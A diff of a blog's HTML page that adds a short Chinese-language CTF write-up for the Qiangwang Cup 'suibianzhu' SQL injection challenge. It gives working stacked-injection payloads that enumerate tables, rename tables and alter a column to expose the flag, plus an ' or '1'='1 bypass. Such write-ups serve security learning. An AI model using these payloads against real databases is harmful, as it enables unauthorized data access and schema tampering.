@@ -246,6 +246,74 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-强网杯-随便注" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date">
+      <time datetime="2020-04-25T07:00:00.000Z" itemprop="datePublished">2020-04-25</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">强网杯-随便注</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>首先判断一下有无注入：输入1’发现不回显，然后1’ #显示正常，应该是存在sql注入了 </p>
+<p>过滤了<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
+<p>尝试堆叠注入 <code>?inject=1&#39;;show databases;%23</code></p>
+<p>查看所有的表 <code>?inject=1&#39;;show tables;%23</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show columns from &#96;1919810931114514&#96;;%23</span><br></pre></td></tr></table></figure>
+<p>发现flag在这张表中</p>
+<p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure>
+<p>最后<code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code>获取flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-2020数字中国虎符CTF之GM&amp;McEliece" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
